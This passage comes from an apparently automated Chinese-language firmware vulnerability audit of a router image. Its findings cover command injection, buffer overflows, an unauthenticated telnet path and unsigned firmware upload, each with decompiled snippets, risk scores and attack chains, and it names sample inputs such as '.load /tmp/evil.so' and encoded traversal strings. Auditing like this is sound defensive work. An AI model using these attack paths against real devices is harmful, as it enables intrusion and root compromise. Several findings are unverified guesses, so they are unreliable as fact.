- **描述:** 高危XML注入漏洞：$GETCFG_SVC变量（来自HTTP请求的'service'节点）未经任何过滤直接输出到<service>标签。攻击者通过污染'service'参数可：a) 注入恶意XML标签破坏文档结构；b) 实施XSS攻击；c) 结合wand.php的文件包含漏洞形成利用链。触发条件：发送包含恶意XML内容的HTTP请求（如service=<script>）。约束条件：需前端控制器（如wand.php）将参数传递至本文件。实际影响：可导致服务端请求伪造(SSRF)或作为命令注入跳板（结合已知漏洞）。
- **代码片段:**
  ```
  <service><?=$GETCFG_SVC?></service>
  ```
- **关键词:** GETCFG_SVC, service, wand.php, SETCFG, ACTIVATE, query("service")
- **备注:** 完整利用链：HTTP请求 → 本文件XML注入 → wand.php文件包含 → 命令注入（root权限）。需验证/phplib/setcfg目录权限；关联发现：知识库中已存在SETCFG/ACTIVATE相关操作（如NVRAM设置）；关键风险：wand.php文件包含漏洞已在知识库中确认（见file-inclusion-wand-setcfg）

---
### AttackChain-WebToHardware

- **文件路径:** `etc/services/LAYOUT.php`
- **位置:** `复合路径: LAYOUT.php & /etc/init.d/网络服务脚本`
- **类型:** 复合漏洞链
- **综合优先级分数:** **8.9**
- **风险等级:** 9.5
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 确认存在完整攻击链：
1. 入口点：外部输入通过Web界面/NVRAM设置污染VLAN参数（$inter_vid等）
2. 传播路径：污染参数在LAYOUT.php中直接拼接到shell命令（vconfig/nvram set）
3. 漏洞触发：命令注入实现任意代码执行（root权限）
4. 最终危害：通过内核模块加载(ctf.ko)和硬件寄存器操作(et robowr)实施硬件级攻击
- 关键特征：无参数过滤、root权限上下文、硬件操作无隔离机制
- 成功利用概率：高（需验证Web接口过滤机制）
- **关键词:** attack_chain, vlan_command_injection, hardware_privilege_escalation, RCE_chain, set_internet_vlan, powerdown_lan
- **备注:** 关联发现：1) CommandExecution-VLANConfig-CommandInjection 2) HardwareOperation-PHYRegisterWrite-PrivilegeIssue。验证需求：1) /htdocs/web配置处理器输入过滤 2) /etc/init.d服务脚本权限上下文

---
### command_injection-udevd-network_recvmsg-0x1194c

- **文件路径:** `sbin/udevd`
- **位置:** `fcn.00011694:0x1194c`
- **类型:** network_input
- **综合优先级分数:** **8.85**
- **风险等级:** 9.2
- **置信度:** 8.5
- **触发可能性:** 8.5
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 在'sbin/udevd'中发现高危命令注入漏洞。攻击者可向udevd监听端口发送特制网络数据包，数据经recvmsg接收后存储于结构体偏移0x170处，随后未经任何过滤直接作为参数传递给execv执行。关键约束条件：1) 仅使用strlcpy复制数据但未过滤命令分隔符；2) 执行点无输入内容验证。触发条件：向udevd暴露的网络接口/IPC通道发送恶意数据包。实际影响：成功利用可实现远程任意命令执行（udevd通常以root权限运行），完整攻击链：网络输入 → 数据接收 → 未过滤传参 → root权限命令执行。
- **代码片段:**
  ```
  sym.imp.execv(*(puVar16 + 0xfffff360), puVar16 + 0xfffff360);
  ```
- **关键词:** recvmsg, execv, fcn.0000f508, fcn.00011694, 0x170, fcn.000108e8, sym.strlcpy, socket(0x10,2,0xf), puVar16 + 0xfffff360
- **备注:** 需后续验证：1) 具体监听端口（需分析fcn.000108e8）；2) 输入数据结构。建议结合固件网络配置分析实际暴露面。

---
### network_input-version_exposure-version_php

- **文件路径:** `htdocs/webinc/version.php`
- **位置:** `version.php:48,67,112`
- **类型:** network_input
- **综合优先级分数:** **8.8**
- **风险等级:** 8.0
- **置信度:** 10.0
- **触发可能性:** 9.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 固件版本通过三种未认证途径暴露：1) 直接读取/etc/config/buildver输出到HTML 2) JavaScript拼接/runtime/device/firmwareversion 3) 组合buildver/buildrev文件。攻击者访问version.php即可获取精确版本匹配漏洞库。触发条件：访问version.php，无过滤输出原始配置内容。
- **代码片段:**
  ```
  var fwver = "<?echo query("/runtime/device/firmwareversion");?>;";
  <span class="value">V<?echo cut(fread("", "/etc/config/buildver"), "0", "\n");?></span>
  ```
- **关键词:** cut(fread("", "/etc/config/buildver"), query("/runtime/device/firmwareversion"), GetQueryUrl()
- **备注:** 需验证/runtime/device/firmwareversion是否受外部输入影响

---
### heap_overflow-SSL_read-memcpy

- **文件路径:** `mydlink/signalc`
- **位置:** `signalc:0x17544 (fcn.000174c0)`
- **类型:** network_input
- **综合优先级分数:** **8.8**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 网络数据处理路径存在堆溢出漏洞：函数fcn.000174c0处理SSL_read/recv接收的网络数据时，使用未经验证的长度参数(param_3)调用memcpy。动态缓冲区(sb)大小计算存在整数溢出风险(iVar4+iVar6)，当攻击者发送特定长度数据时可绕过长度检查。触发条件：1) 建立SSL/TLS连接 2) 发送长度接近INT_MAX的恶意数据。安全影响：可能造成堆破坏、远程代码执行。
- **关键词:** fcn.000174c0, param_3, memcpy, SSL_read, recv, sb, iVar4, iVar6, SBORROW4
- **备注:** 完整攻击链：网络输入→SSL_read→栈缓冲区→fcn.000174c0参数→动态分配→memcpy溢出

---
### network_input-httpd-recvfrom-0x107d0

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0x107d0`
- **类型:** network_input
- **综合优先级分数:** **8.75**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** recvfrom()忽略错误码和部分数据接收（0x000107d0）。作为POST处理链首环，攻击者可利用此缺陷注入恶意数据。触发条件：发送畸形HTTP请求。后续关联漏洞：Content-Length解析漏洞（0x19d88）和sprintf漏洞（0x17e64）。
- **代码片段:**
  ```
  0x000107d0: bl sym.imp.recvfrom
  0x000107d4: str r0, [var_ch]
  ```
- **关键词:** sym.imp.recvfrom, Content-Length, fcn.00017f74, POST处理链
- **备注:** 需验证设备防护机制（ASLR/NX）。关联漏洞链：0x19d88, 0x17e64

---
### network_input-httpd-strtoull-0x19d88

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0x19d88`
- **类型:** network_input
- **综合优先级分数:** **8.75**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** Content-Length解析使用strtoull未验证负值/溢出（0x00019d88）。作为POST处理链第二环，可触发整数溢出。触发条件：发送超长Content-Length值。
- **关键词:** strtoull, Content-Length, POST处理链
- **备注:** 关联漏洞链：0x107d0, 0x17e64

---
### network_input-httpd-sprintf-0x17e64

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0x17e64`
- **类型:** network_input
- **综合优先级分数:** **8.75**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** sprintf使用用户可控路径参数构建字符串（0x00017e64）。作为POST处理链终环，可导致格式化字符串攻击/缓冲区溢出。触发条件：通过前两环传递恶意路径参数。
- **代码片段:**
  ```
  0x00017e64: sym.imp.sprintf(..., 0x2009c4, ..., ppiVar5[-1])
  ```
- **关键词:** sprintf, ppiVar5[-1], POST处理链
- **备注:** 关联漏洞链：0x107d0, 0x19d88

---
### env_get-telnetd-unauth_telnet

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `S80telnetd.sh:4-6`
- **类型:** env_get
- **综合优先级分数:** **8.75**
- **风险等级:** 9.5
- **置信度:** 8.0
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 无认证telnet服务启动路径：当环境变量ALWAYS_TN=1时，脚本启动无认证telnetd服务并绑定到br0接口，设置超长超时参数(999...)。攻击者若污染ALWAYS_TN变量（如通过NVRAM写入漏洞），可直接获得无认证root shell。超时参数可能触发整数溢出（CVE-2021-27137类似风险）。触发条件：1) S80telnetd.sh以'start'执行 2) entn=1（来自devdata get -e ALWAYS_TN）
- **代码片段:**
  ```
  entn=\`devdata get -e ALWAYS_TN\`
  if [ "$1" = "start" ] && [ "$entn" = "1" ]; then
  	telnetd -i br0 -t 99999999999999999999999999999 &
  ```
- **关键词:** devdata get -e ALWAYS_TN, entn, telnetd, -i br0, NVRAM
- **备注:** 核心验证缺失：1) 未逆向/sbin/devdata确认ALWAYS_TN存储机制 2) 未验证超时参数是否导致整数溢出。后续需：1) 分析devdata二进制 2) 审计NVRAM写入接口 3) 反编译telnetd验证超时处理

---
### attack_chain-file_tampering_to_dual_compromise

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `跨组件: /etc/config/image_sign → /etc/init.d/S20init.sh + /etc/init0.d/S80telnetd.sh`
- **类型:** configuration_load
- **综合优先级分数:** **8.75**
- **风险等级:** 9.2
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 文件篡改双重攻击链：污染/etc/config/image_sign文件 → 同时影响telnetd认证凭证（S80telnetd.sh）和xmldb服务参数（S20init.sh）。完整路径：1) 攻击者通过文件写入漏洞（如权限配置错误）篡改image_sign文件内容 2a) telnetd服务使用该内容作为密码，导致认证绕过 2b) xmldb服务使用该内容作为启动参数，可能触发命令注入（需验证）。依赖条件：a) 文件可被外部篡改 b) xmldb存在参数注入漏洞。实际影响：系统全面沦陷（认证绕过+特权命令执行）。
- **关键词:** /etc/config/image_sign, image_sign, xmldb, telnetd, file_read
- **备注:** 关键验证任务：1) 调用FileAnalysisDelegator检查/etc/config/image_sign文件权限 2) 反编译/sbin/xmldb验证参数注入漏洞 3) 全局搜索image_sign文件写入点（grep -r 'image_sign' /）

---
### CommandExecution-VLANConfig-CommandInjection

- **文件路径:** `etc/services/LAYOUT.php`
- **位置:** `LAYOUT.php:未知 [set_internet_vlan/layout_router] 0x0`
- **类型:** command_execution
- **综合优先级分数:** **8.7**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** VLAN配置参数($lan1id/$inter_vid等)未经验证直接拼接到shell命令，存在命令注入漏洞。具体表现：
- set_internet_vlan()函数将从'/device/vlan/lanport'获取的$lan1id等参数直接拼接进`nvram set`命令
- layout_router()函数将从'/device/vlan'获取的$inter_vid直接拼接到`vconfig add`命令
- 触发条件：攻击者通过Web界面/NVRAM设置污染VLAN配置参数
- 实际影响：成功注入可导致任意命令执行，结合root权限形成RCE漏洞链
- 边界检查：无任何过滤或白名单机制
- **代码片段:**
  ```
  startcmd('nvram set vlan1ports="'.$nvram_ports.'"');
  startcmd('vconfig add eth0 '.$inter_vid);
  ```
- **关键词:** set_internet_vlan, layout_router, $lan1id, $inter_vid, vconfig, nvram set, /device/vlan/lanport, /device/vlan/interid
- **备注:** 需验证Web配置接口是否对VLAN参数做边界检查。关联文件：/htdocs/web相关配置处理器

---
### command_execution-mtools-stack_overflow_fcn0000d028

- **文件路径:** `usr/bin/mtools`
- **位置:** `text:0xd070 fcn.0000d028`
- **类型:** command_execution
- **综合优先级分数:** **8.65**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危栈溢出漏洞：在路径处理函数(fcn.0000d028)中直接使用strcpy复制用户控制的文件名参数到固定大小栈缓冲区(puVar5)，无长度验证。触发条件：攻击者提供超长文件名(>目标缓冲区大小)。实际影响：可覆盖返回地址实现任意代码执行，风险评级严重。
- **代码片段:**
  ```
  sym.imp.strcpy(puVar5, param_1 + 10);
  ```
- **关键词:** strcpy, param_1, puVar5, fcn.0000d028
- **备注:** 攻击面明确：通过mtools子命令（如mcopy）的文件名参数触发

---
### permission-escalation-root-script-777

- **文件路径:** `mydlink/mydlink-watch-dog.sh`
- **位置:** `mydlink/mydlink-watch-dog.sh`
- **类型:** command_execution
- **综合优先级分数:** **8.65**
- **风险等级:** 9.2
- **置信度:** 9.5
- **触发可能性:** 6.0
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 高危权限配置漏洞：脚本具有777权限且以root运行。触发条件：攻击者获得任意本地shell访问后篡改脚本内容。安全影响：1) 权限提升至root 2) 持久化后门植入。利用方式：修改脚本添加恶意命令，等待看门狗机制执行。边界检查：无任何权限控制机制。
- **关键词:** mydlink-watch-dog.sh, chmod 777, root UID, privilege_escalation
- **备注:** 需结合初始访问漏洞形成完整攻击链

---
### command_execution-sqlite3-dynamic_loading

- **文件路径:** `bin/sqlite3`
- **位置:** `fcn.0000d0c0:0xebe4`
- **类型:** command_execution
- **综合优先级分数:** **8.65**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** sqlite3动态加载机制(.load指令)允许加载任意共享库。攻击者通过命令行提供恶意路径参数(如'.load /tmp/evil.so')，触发sqlite3_load_extension直接加载外部库。路径参数未经验证/过滤，无文件扩展名检查。触发条件：攻击者控制命令行参数且可写入目标路径（如通过文件上传漏洞）。安全影响：在数据库进程上下文实现任意代码执行(RCE)，风险等级高。
- **代码片段:**
  ```
  iVar3 = sym.imp.sqlite3_load_extension(**(piVar12 + (0xe918 | 0xffff0000) + 4), piVar12[-0x24], piVar12[-0x25], piVar12 + -400);
  ```
- **关键词:** sqlite3_load_extension, .load, piVar12[-0x24], piVar12[-0x25], SQLITE_LOAD_EXTENSION
- **备注:** 需固件暴露命令行调用接口。建议检查环境变量SQLITE_LOAD_EXTENSION是否强制启用扩展。关联发现：可通过SQL注入触发此漏洞（见sqlite3_exec相关记录）

---
### heap_overflow-dnsmasq-fcn_00012d1c

- **文件路径:** `usr/sbin/dnsmasq`
- **位置:** `dnsmasq:0x12d1c (fcn.00012d1c)`
- **类型:** network_input
- **综合优先级分数:** **8.65**
- **风险等级:** 8.7
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** dnsmasq的DNS响应处理函数(fcn.00012d1c)存在堆缓冲区溢出漏洞。当处理恶意构造的超长域名(>4096字节)的DNS响应包时，sprintf格式化输出后执行*piVar5 += iVar3累积写入操作，未验证累积值是否超出初始分配的0x1000字节堆缓冲区边界。触发条件：1) dnsmasq启用DNS服务（默认启用）2) 攻击者发送特制DNS响应包 3) 无任何边界检查机制。利用方式：通过覆盖堆元数据实现远程代码执行，成功概率取决于内存布局操控精度。
- **代码片段:**
  ```
  *piVar5 += iVar3;  // 无边界检查的累积写入
  ```
- **关键词:** fcn.00012d1c, fcn.00010a84, recvfrom, piVar5, iVar3, sprintf, malloc, DNS
- **备注:** 完整攻击路径：网络输入(recvfrom)→DNS解析(fcn.00010a84)→危险写入(fcn.00012d1c)。需验证：1) CVE-2017-14491是否与此相关 2) 不同架构下的堆布局可利用性 3) 其他版本是否存在相同问题

---
### cross_component_attack_chain-param_2

- **文件路径:** `usr/sbin/mydlinkeventd`
- **位置:** `跨组件：httpc→sqlite3/mydlinkeventd`
- **类型:** network_input
- **综合优先级分数:** **8.6**
- **风险等级:** 9.0
- **置信度:** 8.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 发现基于param_2参数的完整攻击链：1) 入口点：httpc组件(fcn.000136e4)解析HTTP参数时未验证param_2长度，形成内存破坏风险；2) 传播路径：param_2可传递至sqlite3组件执行未过滤SQL命令（SQL注入）或mydlinkeventd组件直接拼接系统命令（命令注入）；3) 危害终点：以root权限执行任意命令或破坏数据库。触发步骤：构造特制HTTP请求包含恶意主机名参数。完整利用概率：路径A高(8.5/10)，路径B中(6.5/10需验证.load扩展)。
- **代码片段:**
  ```
  // HTTP参数解析 (httpc)
  pcVar1 = strchr(HTTP_param, '=');
  *(param_2+4) = pcVar1; // 未验证长度
  
  // SQL命令执行 (sqlite3)
  sqlite3_exec(db, param_2, 0, 0, 0);
  
  // 系统命令执行 (mydlinkeventd)
  snprintf(cmd, "phpsh %s SUBJECTPATH=\"%s\"", MYDLINKMAIL.php, param_2);
  system(cmd);
  ```
- **关键词:** param_2, httpc, mydlinkeventd, sqlite3, sym.md_send_mail, fcn.000136e4, sqlite3_exec, 跨组件攻击链
- **备注:** 需验证：1) httpc是否向mydlinkeventd传递param_2 2) sqlite3组件是否启用.load扩展 3) /var目录权限是否允许符号链接攻击叠加风险

---
### stack_overflow-http_handler-remote_addr

- **文件路径:** `htdocs/cgibin`
- **位置:** `htdocs/cgibin:fcn.0000d17c:0xd17c`
- **类型:** network_input
- **综合优先级分数:** **8.55**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** REMOTE_ADDR环境变量触发的栈溢出漏洞：攻击者通过伪造X-Forwarded-For等HTTP头部控制REMOTE_ADDR→通过getenv('REMOTE_ADDR')获取污染数据→传递至fcn.0000d17c的param_2参数→触发strcpy栈溢出（目标缓冲区仅40字节）。触发条件：REMOTE_ADDR长度>39字节且以'::ffff:'开头时覆盖栈帧。实际影响：远程代码执行(RCE)，因HTTP头部完全可控且无边界检查，成功概率高。
- **代码片段:**
  ```
  strcpy(auStack_40, param_2); // 缓冲区仅40字节
  ```
- **关键词:** REMOTE_ADDR, getenv, fcn.000123e0, strcpy, ::ffff:
- **备注:** 污染路径完整：HTTP头部→环境变量→函数参数。需验证栈帧布局是否覆盖返回地址。关联现有环境变量长度验证需求（notes字段）

---
### network_input-httpd-urldecode-0x1b5a8

- **文件路径:** `sbin/httpd`
- **位置:** `sbin/httpd:0x1b5a8`
- **类型:** network_input
- **综合优先级分数:** **8.55**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** URL解码函数(fcn.0001b5a8)安全隐患：1) %00解码不终止处理；2) 不过滤路径遍历字符；3) 十六进制转换逻辑错误。触发条件：HTTP请求含编码恶意序列（如%00/%2e%2e%2f）。
- **代码片段:**
  ```
  if (*(puVar5 + -1) != '%') {
    // 不过滤遍历字符
  }
  uVar1 = ((*(puVar5 + -8) & 7) + '\t') * '\x10'
  ```
- **关键词:** fcn.0001b5a8, *(puVar5 + -1) == '\0', *(puVar5 + -1) != '%'
- **备注:** 需结合fcn.0000a640调用点验证。可能与POST处理链的路径参数处理相关（0x17e64）

---
### file_read-nsswitch-fcn.6017f4b0

- **文件路径:** `usr/bin/qemu-arm-static`
- **位置:** `fcn.6017f4b0:0x6017f5d3`
- **类型:** file_read
- **综合优先级分数:** **8.5**
- **风险等级:** 9.5
- **置信度:** 8.5
- **触发可能性:** 6.0
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** nsswitch.conf堆溢出漏洞：四阶段利用链：1) 读取超长配置文件行 2) 长度计算未校验（fcn.60147140）3) 内存分配整数溢出（size=len+0x11）4) 数据复制越界。触发条件：攻击者需覆盖/etc/nsswitch.conf（需文件写入权限）。实际影响：通过精心构造的配置文件实现RCE。
- **代码片段:**
  ```
  puVar6 = fcn.601412a0((puVar13 - param_1) + 0x31);
  fcn.60156490(puVar6, param_1, puVar13 - param_1);
  ```
- **关键词:** fcn.6017f4b0, fcn.6019e560, fcn.60147140, 0x6253eac8
- **备注:** 需评估固件中/etc目录写权限约束，验证整数溢出条件（len>0xFFFFFFEF）

---
### attack_chain-mydlink_mount_exploit

- **文件路径:** `etc/config/usbmount`
- **位置:** `跨组件: etc/config/mydlinkmtd → etc/init.d/S22mydlink.sh`
- **类型:** configuration_load
- **综合优先级分数:** **8.5**
- **风险等级:** 9.1
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 完整攻击链：全局可写配置文件(etc/config/mydlinkmtd)被篡改 → S22mydlink.sh通过xmldbc获取污染配置 → 执行mount挂载恶意设备。触发步骤：1) 攻击者利用文件上传/NVRAM覆盖等漏洞修改mydlinkmtd内容 2) 通过xmldbc设置/mydlink/mtdagent节点值 3) 设备重启或服务重载触发挂载操作。实际影响：CVSS 9.1（挂载恶意FS可导致RCE）。成功概率：需同时控制配置文件和节点值，但两者均存在写入路径（Web接口/SETCFG）
- **代码片段:**
  ```
  攻击链核心代码段：
  domount=\`xmldbc -g /mydlink/mtdagent\`
  if [ "$domount" != "" ]; then
  	mount -t squashfs $MYDLINK /mydlink
  fi
  ```
- **关键词:** mydlinkmtd, S22mydlink.sh, mount, xmldbc, mtdagent, domount
- **备注:** 关联知识库记录：configuration_load-mydlinkmtd-global_write（风险源）、configuration_load-S22mydlink_mount_chain（执行点）。待验证：1) xmldbc节点写入权限 2) 挂载操作的隔离机制

---

## 中优先级发现

### firmware_unauth_upload-fwupdate_endpoint

- **文件路径:** `htdocs/cgibin`
- **位置:** `htdocs/cgibin:cgibin字符串表(0x2150)`
- **类型:** network_input
- **综合优先级分数:** **8.45**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 固件更新端点高危操作：/fwup.cgi和/fwupload.cgi处理固件上传(type=firmware)时仅校验ERR_INVALID_SEAMA错误。触发条件：访问端点上传文件。实际风险：无签名验证机制，攻击者可上传恶意固件实现持久化控制。边界检查缺失证据：使用文件锁但无输入长度验证。
- **关键词:** fwup.cgi, fwupload.cgi, type=firmware, /var/run/fwseama.lock, ERR_INVALID_SEAMA
- **备注:** 需验证端点处理函数是否校验文件签名。关联Web配置接口验证需求（notes字段）

---
### network_input-CT_Command_Recv-integer_wrap

- **文件路径:** `mydlink/tsa`
- **位置:** `tsa:0x9fd4 (fcn.00009d50)`
- **类型:** network_input
- **综合优先级分数:** **8.45**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** CT_Command_Recv累积接收整数回绕漏洞：当累积接收长度(var_10h)超过0x1000时，recv长度参数(0x1000 - var_10h)回绕为极大正值，导致向sp+0x20缓冲区超限写入。攻击者通过分块发送>4096字节payload，可覆盖返回地址(sp+0x12A0)。触发条件：1) 多包发送累计长度>4096 2) 最后一包触发回绕。无栈保护机制(canary)简化利用。
- **代码片段:**
  ```
  0x9fdc: rsb r2, ip, 0x1000  // 当ip>0x1000时r2为负值
  0x9fe0: bl sym.imp.recv     // 负长度回绕为超大正数
  ```
- **关键词:** CT_Command_Recv, recv, var_10h, sp+0x20, sp+0x12A0, 0x1000, CT_Command
- **备注:** 实际偏移：返回地址距缓冲区起始0x1280字节。需验证网络服务端口开放状态。攻击路径：网络输入 → 多包recv累积 → 长度计数器回绕 → 超限写入覆盖返回地址。整体弱点：双重缺失保护（无输入长度验证+无栈溢出防护），可利用性高（8.0/10）

---
### network_protocol_overflow-signalc-fcn00011120

- **文件路径:** `mydlink/signalc`
- **位置:** `signalc:0x11120`
- **类型:** network_input
- **综合优先级分数:** **8.45**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** 网络协议解析漏洞：1) fcn.00011120函数处理标签长度(uVar19)时未验证剩余缓冲区大小(iVar14) 2) 当攻击者发送标签长度>0x1020的畸形包时引发越界内存访问 3) 触发条件：特制网络包使uVar19 > iVar14 4) 安全影响：可能破坏堆结构或覆盖关键指针，导致拒绝服务或远程代码执行。边界检查仅记录错误但继续执行。
- **关键词:** fcn.00011120, puVar16, uVar19, iVar14, dlink_pkt_process, 0x1020
- **备注:** 需动态验证内存布局和0x85701688校验有效性。关联现有param_2攻击链

---
### cross_component_chain-httpd_to_mdns-sprintf_exploit

- **文件路径:** `sbin/httpd`
- **位置:** `复合路径: sbin/httpd 与 bin/mDNSResponderPosix`
- **类型:** network_input
- **综合优先级分数:** **8.4**
- **风险等级:** 9.5
- **置信度:** 7.5
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 跨组件攻击链：通过httpd的POST处理链漏洞（0x107d0→0x19d88→0x17e64）获得初始代码执行后，可利用mDNSResponderPosix组件的sprintf栈溢出漏洞实现权限提升。完整步骤：1) 发送恶意HTTP请求触发httpd漏洞执行命令；2) 创建超长接口名（如eth0:...:AAAA...）；3) 触发mDNS服务读取/proc/net/if_inet6；4) 利用sprintf栈溢出覆盖返回地址。
- **代码片段:**
  ```
  // httpd漏洞链
  0x00017e64: sym.imp.sprintf(...)
  
  // mDNS漏洞点
  sym.imp.sprintf(dest, "%s:%s:%s:%s:%s:%s:%s:%s", ...);
  ```
- **关键词:** sprintf, POST处理链, get_ifi_info_linuxv6, 跨组件攻击链
- **备注:** 验证需求：1) httpd漏洞实际利用可行性 2) mDNS漏洞栈布局分析 3) 接口名长度限制机制

---
### stack_overflow-get_ifi_info_linuxv6-1

- **文件路径:** `bin/mDNSResponderPosix`
- **位置:** `mDNSResponderPosix:0 (get_ifi_info_linuxv6) 0x0`
- **类型:** network_input
- **综合优先级分数:** **8.35**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 在get_ifi_info_linuxv6函数中发现高危栈缓冲区溢出漏洞：
- 触发条件：当系统读取包含恶意接口名的/proc/net/if_inet6文件时（攻击者可通过配置恶意网络接口实现）
- 漏洞机制：使用sprintf组合8个外部输入字段（格式字符串'%s:%s:%s:%s:%s:%s:%s:%s'），目标缓冲区为栈上固定168字节空间
- 边界检查失效：fscanf读取接口名时限制8字符，但sprintf组合时未校验总长度，允许最大2047字节输入
- 安全影响：可覆盖返回地址实现任意代码执行，因mDNS服务通常以root权限运行
- 完整攻击路径：攻击者创建超长接口名 → 触发/proc/net/if_inet6文件变更 → mDNS服务读取文件 → sprintf栈溢出 → 控制流劫持
- **代码片段:**
  ```
  iVar1 = sym.imp.fscanf(..., "%8s", ...);
  sym.imp.sprintf(dest, "%s:%s:%s:%s:%s:%s:%s:%s", ...);
  ```
- **关键词:** get_ifi_info_linuxv6, sprintf, fscanf, /proc/net/if_inet6, if_inet6, auStack_a8
- **备注:** 需验证：1) 固件是否启用IPv6 2) 接口名最大长度限制机制 3) 栈布局和偏移量计算

---
### CommandExecution-phyinf-38

- **文件路径:** `etc/services/PHYINF/phyinf.php`
- **位置:** `phyinf.php:38 phyinf_setmedia()`
- **类型:** command_execution
- **综合优先级分数:** **8.35**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危命令注入漏洞：攻击者可通过篡改NVRAM配置节点（如/phyinf/media/linktype）污染$media参数，触发phyinf_setmedia()中的命令注入（'slinktype -i $port -d $media'）。具体表现：1) $media直接拼接进命令（L38）；2) 无任何输入过滤或边界检查；3) 触发条件：外部调用phyinf_setup()（如网络重置事件）且污染配置存在。成功利用可导致任意命令执行，需攻击者具备配置篡改能力（如通过Web漏洞）。
- **代码片段:**
  ```
  startcmd("slinktype -i ".$port." -d ".$media);
  ```
- **关键词:** phyinf_setmedia, phyinf_setup, startcmd, slinktype, $media, $port, query($phyinf."/media/linktype"), /runtime/device/layout, XNODE_getpathbytarget
- **备注:** 完整攻击链依赖：1) NVRAM节点写入漏洞（需分析Web接口）；2) 触发phyinf_setup()的外部机制（如IPC调用）

---
### buffer-overflow-httpc-multi

- **文件路径:** `usr/sbin/httpc`
- **位置:** `httpc:0x17fa0, 0xd48c, 0x12f64`
- **类型:** network_input
- **综合优先级分数:** **8.35**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 缓冲区溢出风险：发现三处关键漏洞：1) fcn.00017f5c中param_2复制到256字节栈数组(auStack_118)时无边界检查；2) fcn.0000d2cc中param_4复制到14字节栈空间时无检查；3) fcn.00012d74循环strcpy堆操作未校验单个字符串长度。攻击者控制对应参数可分别导致栈/堆溢出。触发条件：提供超长输入参数，利用概率中高（7.0/10）。
- **关键词:** fcn.00017f5c, auStack_118, fcn.0000d2cc, param_4, fcn.00012d74, puVar4[-5], param_2_cross_component
- **备注:** 需关联验证param_2/param_4是否来自HTTP输入。跨组件提示：param_2在rgbin组件中存在未验证存储（见'http-param-parser-rgbin-000136e4'），可能形成HTTP→缓冲区溢出链

---
### cross_component_attack_chain-param_2_servd

- **文件路径:** `usr/sbin/servd`
- **位置:** `跨组件：servd/httpc→servd内部`
- **类型:** network_input
- **综合优先级分数:** **8.35**
- **风险等级:** 9.0
- **置信度:** 7.5
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 发现基于param_2参数的完整攻击链：1) 网络入口点：servd(fcn.0000b870)直接接收网络数据或通过httpc(fcn.000136e4)传递HTTP参数；2) 传播路径：param_2通过servd内部IPC(fcn.0000a030)传递到其他组件；3) 危害终点：a) servd栈缓冲区溢出实现RCE b) 污染链表节点触发命令注入 c) 伪造IPC请求写入敏感日志。触发条件：攻击者发送特制网络数据包。完整利用概率：路径A高(8.5/10)，路径B/C中等(6.0/10需验证节点污染机制)
- **代码片段:**
  ```
  // servd栈溢出点
  strcpy(auStack_200c, param_2);
  
  // servd命令注入点
  sprintf(cmd_buf, "ping %s", *(piVar6[-4] + 0x10));
  system(cmd_buf);
  ```
- **关键词:** param_2, fcn.0000b870, fcn.000136e4, fcn.0000a030, fcn.00009b10, strcpy, system, 跨组件攻击链
- **备注:** 需动态验证：1) servd与httpc的进程通信机制 2) 链表节点创建函数(fcn.0000f09c)是否接收IPC输入 3) 全局文件流*(0xf2e0|0x10000)的实际目标

---
### memory_corruption-index_operation-oob_access-0xa650

- **文件路径:** `usr/sbin/xmldbc`
- **位置:** `函数:0xa650 @0xa674`
